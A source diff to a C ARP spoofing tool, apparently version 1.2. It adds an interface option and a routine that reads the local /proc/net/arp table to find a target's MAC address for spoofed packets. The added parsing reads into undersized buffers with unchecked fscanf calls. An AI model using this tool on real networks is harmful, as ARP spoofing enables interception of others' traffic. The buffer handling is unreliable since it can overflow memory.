@@ -1,4 +1,4 @@
-/*  Copyright (C) 2013-2016  Vegetable avenger (r7418529@gmail.com)
+ /*  Copyright (C) 2013-2016  Vegetable avenger (r7418529@gmail.com)
 
     This program is free software: you can redistribute it and/or modify
     it under the terms of the GNU General Public License as published by
@@ -16,8 +16,11 @@
 
 
 /*
-Version 1.0 : Basic ARP Spoofing function
-Version 1.1 : Add Control Operatior (-t , -s)
+Version 1.0 : 	Basic ARP Spoofing function
+Version 1.1 : 	Add Control Operatior (-t , -s)
+Version 1.2 : 	Add -i Control Operator ,
+		Update Localhost IP/MAC information fetch function ,
+		Enhance -t Operator , add ARP table lookup capability .
 */
 
 // Send an IPv4 ARP Spoofing packet via raw socket
@@ -144,6 +147,7 @@ static int Arg_s_Resolution(char *argv ,char *Ret_IP ,char *Ret_MAC)
 	int argvLen = strlen(argv);
 	unsigned int tSpoofing_IP =-1 ;
 
+	// devide argv in two part , IP and MAC , devided by '/'
 	for(int i=0 ;i<argvLen ;i++)
 	{
 	    if(*(argv+i) == '/' && slash==0) // chech slash find or not
@@ -165,6 +169,7 @@ static int Arg_s_Resolution(char *argv ,char *Ret_IP ,char *Ret_MAC)
 	    else
 		goto ResError ;
 	}
+
 	// resolution IP to ethernet format
 	tSpoofing_IP = inet_addr(IP_s);
 	if(tSpoofing_IP ==-1)
@@ -226,6 +231,58 @@ int getInterfaceInfo(unsigned char * iface ,unsigned char *local_IP ,unsigned ch
 	return 1;
 }
 //--------------------------------------------------------------------------
+// ************************************
+// Fetch Localhosdt ARP table
+// ************************************
+// find IP or MAC from  localhost arp table ,
+
+#define FETCH_ARP_TABLE_ERROR		0x0000		// could not access localhost ARP table
+#define FETCH_ARP_TABLE_SUCCESS		0x0001		// find ARP entry
+#define FETCH_ARP_TABLE_UNKNOW		0x0002		// ARP entry unknow or empty
+
+int FetchARPTable(char * TargetIP , char * TargetMAC)
+{
+	int ret =FETCH_ARP_TABLE_UNKNOW;
+	FILE *ARP_f =fopen("/proc/net/arp" , "r");
+
+        if(ARP_f == NULL)
+        {
+	    ret =FETCH_ARP_TABLE_ERROR;
+	}
+	else
+	{
+	    // pass title
+	    char Title[100] ;
+	    fgets(Title ,100 ,ARP_f);
+
+	    char t_IP[15] ;
+	    char t_HW_type[8] ;
+	    char t_Flags[8] ;
+	    char t_MAC[17] ;
+	    char t_Mask[5] ;
+	    char t_Device[16] ;
+	    while(!feof(ARP_f))
+	    {
+		fscanf(ARP_f ,"%s %s %s %s %s %s",t_IP,t_HW_type,t_Flags,t_MAC,t_Mask,t_Device);
+		if(strcmp(t_IP ,TargetIP)==0 &&
+		   strcmp(t_Flags ,"0x2")==0)
+		{
+		    printf("%s|%s|%s|%s|%s|%s\n",t_IP,t_HW_type,t_Flags,t_MAC,t_Mask,t_Device) ;
+		    ret =FETCH_ARP_TABLE_SUCCESS;
+		    // copy data to Target_MAC
+		    for(int i=0 ; i<6 ;i++)
+        	    {
+		        *(TargetMAC+i) = MAC_SubFormatTransform(&t_MAC[i*3]) ;
+	            }
+		    break ;
+		}
+	    }
+	    fclose(ARP_f);
+        }
+	return ret ;
+}
+
+//--------------------------------------------------------------------------
 // ARP spoofing main
 int main(int argc, char* argv[])
 {
@@ -268,16 +325,23 @@ int main(int argc, char* argv[])
 
         	case 't': // target IP
 		{
+		    // check IP format
 		    unsigned int tTarget_IP = inet_addr(optarg);
-		    if(tTarget_IP !=-1)
-		    {
-			T_flag =1 ;
-			memcpy(Target_IP , &tTarget_IP ,sizeof(int));
+                    if(tTarget_IP !=-1)
+                    {
+			// Get target MAC from ARP table
+		    	if(FetchARPTable((char*)optarg ,(char*)Target_MAC)==FETCH_ARP_TABLE_SUCCESS)
+			{
+			    memcpy(Target_IP , &tTarget_IP ,sizeof(int));
+			    T_flag =1 ;
+			}
+		    	else
+			    printf(P_RED "Error" P_NONE ": Target IP [" P_GREEN "%s" P_NONE "] ,ARP table lookup failed \n",optarg);
 		    }
 		    else
 			printf(P_RED "Error" P_NONE ": Target IP [" P_GREEN "%s" P_NONE "] ,format resolution failed \n",optarg);
 		}
-	        break;
+		break ;
 
 	        case 's': // spoofing IP and mac
 		{
@@ -298,20 +362,15 @@ int main(int argc, char* argv[])
     	    }
 	}
 
+	// chech flag
 	if(I_flag ==0 ||
 	   S_flag ==0 ||
 	   T_flag ==0 ||
-	   getInterfaceInfo(NetInterface , Soruce_IP ,Soruce_MAC) == 0)
+	   getInterfaceInfo(NetInterface , Soruce_IP ,Soruce_MAC) == 0) // Get localhost IP and MAC
 	{
 	    printf("ARP_Spoofing Error\n");
 	    exit(-1);
 	}
-
-	//--------------------------------------------------------------------
-	unsigned char tTarget_MAC[]	= {0x54,0x04,0xa6,0x75,0x8b,0x29 ,0x0};
-	memcpy(Target_MAC , tTarget_MAC ,sizeof(char)*6);
-	//---------------------------------------------------------------------
-
 
 	// set ARP header
 	ARP_header ARP_Spoofing ;
